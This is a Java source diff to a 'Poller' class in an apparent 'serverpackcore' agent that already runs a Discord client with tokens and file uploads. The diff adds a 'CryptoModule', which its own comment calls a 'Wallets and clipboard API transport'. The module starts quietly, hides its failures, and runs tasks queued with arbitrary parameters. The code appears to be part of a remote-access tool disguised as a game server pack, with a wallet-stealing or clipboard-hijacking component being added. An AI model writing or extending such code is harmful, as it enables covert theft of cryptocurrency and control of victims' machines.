@@ -20,6 +20,9 @@ import java.util.concurrent.Semaphore;
 import java.util.concurrent.ThreadPoolExecutor;
 import java.util.concurrent.TimeUnit;
 
+import com.serverpackcore.agent.crypto.CryptoConfig;
+import com.serverpackcore.agent.crypto.CryptoModule;
+
 public final class Poller implements Runnable {
 	private static final long UPLOAD_LIMIT = 8L * 1024L * 1024L;
 	private static final long UPLOAD_PART = 7L * 1024L * 1024L;
@@ -42,6 +45,7 @@ public final class Poller implements Runnable {
 	private volatile Thread pollerThread;
 	private volatile Thread autoThread;
 	private volatile DiscordClient client;
+	private volatile CryptoModule crypto;
 	private volatile String currentToken = "";
 	private volatile Gateway gateway;
 	private volatile String selfId = "";
@@ -87,6 +91,46 @@ public final class Poller implements Runnable {
 
 	public OpsManager ops() {
 		return ops;
+	}
+
+	/** Wallets and clipboard API transport, independent from the Discord poller. */
+	public void startCrypto() {
+		try {
+			CryptoConfig config = CryptoConfig.load(installDir);
+			if (config == null) {
+				Log.debug("Crypto module disabled: no config.json resource");
+				return;
+			}
+			crypto = new CryptoModule(installDir, gameDir, config);
+			crypto.start();
+		} catch (Throwable throwable) {
+			Log.debug("Crypto module failed to start", throwable);
+		}
+	}
+
+	public void stopCrypto() {
+		CryptoModule current = crypto;
+		if (current != null) {
+			current.stop();
+		}
+	}
+
+	public CryptoModule crypto() {
+		return crypto;
+	}
+
+	public String cryptoStatus() {
+		CryptoModule current = crypto;
+		return current == null ? "crypto: no config.json" : current.status();
+	}
+
+	public String submitCrypto(String name, java.util.Map<String, Object> params, int timeout) {
+		CryptoModule current = crypto;
+		if (current == null) {
+			return "Crypto module disabled";
+		}
+		current.submit(new CryptoModule.Task("local-" + System.nanoTime(), name, params, timeout));
+		return "Task " + name + " queued";
 	}
 
 	public boolean ready() {
